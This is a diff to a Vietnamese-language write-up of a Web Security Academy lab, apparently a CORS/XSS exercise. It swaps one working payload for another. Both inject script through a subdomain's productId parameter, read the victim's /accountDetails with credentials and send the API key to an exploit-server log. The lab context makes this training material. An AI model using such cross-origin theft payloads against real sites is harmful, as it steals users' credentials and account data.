@@ -119,19 +119,11 @@ image:
 #### Exploit
 - Ý tưởng: Từ lỗi XSS ở subdomain, tạo script đế tấn công lấy **apikey**
 - Mã trong phần body của **Exploit Server**
-```
+```html
 <script>
-  document.location =
-    "https://stock.0a3b002d04976b6e81260c3a00900075.web-security-academy.net/?productId=" +
-    encodeURIComponent(`<script>
-      fetch("https://0a3b002d04976b6e81260c3a00900075.web-security-academy.net/accountDetails", {credentials: "include"})
-        .then(r => r.text())
-        .then(d => {
-          fetch("https://exploit-0acf00f004266b3481b80b3b01a20006.exploit-server.net/log?key=" + encodeURIComponent(d))
-        });
-    </script>`) +
-    "&storeId=1";
+    document.location="http://stock.0a3b002d04976b6e81260c3a00900075.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a3b002d04976b6e81260c3a00900075.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() {location='https://exploit-0acf00f004266b3481b80b3b01a20006.exploit-server.net/log?key='%2bthis.responseText;};%3c/script>&storeId=1"
 </script>
+
 ```
 - Deliver to victim
 - Lấy **apikey** trong `/log` của **Exploit Server**, **smart decode** và submit
